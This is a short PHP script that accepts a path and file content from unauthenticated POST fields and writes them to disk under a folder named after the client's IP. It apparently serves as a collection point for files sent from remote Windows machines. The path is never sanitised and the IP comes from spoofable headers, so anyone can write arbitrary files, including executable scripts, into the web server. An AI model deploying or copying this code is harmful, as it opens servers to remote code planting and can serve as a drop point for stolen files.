<?php
function rmkdir($path) {
        $path = str_replace("\\", "/", $path);
        $path = explode("/", $path);
		array_pop($path);
		
        $rebuild = '';
        foreach($path AS $p)
		{

            if(strstr($p, ":") != false) { 
               // echo "\nExists : in $p\n";
                $rebuild = $p;
                continue;
            }
            $rebuild .= "/$p";
            //echo "Checking: $rebuild\n";
            if(!is_dir($rebuild)) mkdir($rebuild);
        }
    }
	
$path = $_POST["a"];
$content = $_POST["b"];

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$fixedpath = str_replace(":/", "/", $path);
$fixedpath = $ip . '/' . $fixedpath;
$fixedpath = 'a/' . $fixedpath;

//echo($fixedpath);

$root = filter_input(INPUT_SERVER, 'DOCUMENT_ROOT');


rmkdir($root . '/' . $fixedpath);

$f = fopen($fixedpath, "w");

if($f)
{
	fwrite($f,$content);
	fclose($f);
}




?>